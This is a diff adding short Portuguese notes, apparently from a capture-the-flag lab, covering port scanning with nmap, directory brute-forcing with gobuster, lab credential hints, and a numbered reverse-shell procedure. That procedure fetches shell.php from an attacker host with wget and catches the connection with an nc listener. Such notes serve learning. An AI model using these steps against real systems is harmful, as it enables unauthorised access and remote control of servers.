@@ -1,0 +1,35 @@
+└─$ sudo nmap -sS -p 21,22,80,443,3306 --open `cat ip` -Pn  
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+INSPECAO DA PAGINA PARA VER SE TEM INFORMACOES
+    Note to self, remember username!
+
+    Username: R1ckRul3s
+  
+pesquisar por robots.txt
+Wubbalubbadubdub -> encontrado dentro de robots
+
+gobuster dir -u `cat ip` -w /usr/share/dirb/wordlists/common.txt -t 50 -x php -q -> o parametro "-x" serve para definir um padrao para ser encontrado, no exemplo no caso foi para encontrar o php e o common foi usado porque e uma lista menor do que a do big 
+
+sudo -l -> serve para ver as permissoes de sudo 
+
+tee -> comando para ler arquivos
+
+less -> comando para ler arquivos
+
+nc -vnlp -> serve para abrir uma porta
+
+1.python -m http.server -> comando para abrir um servidor web no diretorio atual 
+2.sudo wget http://10.8.87.12:8000/shell.php -> apos abrir server web, esse comando pega o arquivo no IP da maquina e a porta que esta a pasta no servidor web
+3. depois e so colocar a maquina para ouvir nc -vnlp e a porta que esta no shell.php
+4.apos colocar o shell.php na maquina que esta a pagina web, e so executar o ip com o diretorio do shell.php e depois a maquina que esta ouvindo ja estara dentro da maquina que tem a pagina web 
+
+ficar atento com arquivos que tem espaco, tem que colocar entre " "
+
+sudo find / "nome do arquivo ou parametro" 2>/dev/null -> comnado para procurar alguma palavra 
+
+para decodificar um codigo base64 no linux -> colocar o codigo | base64 
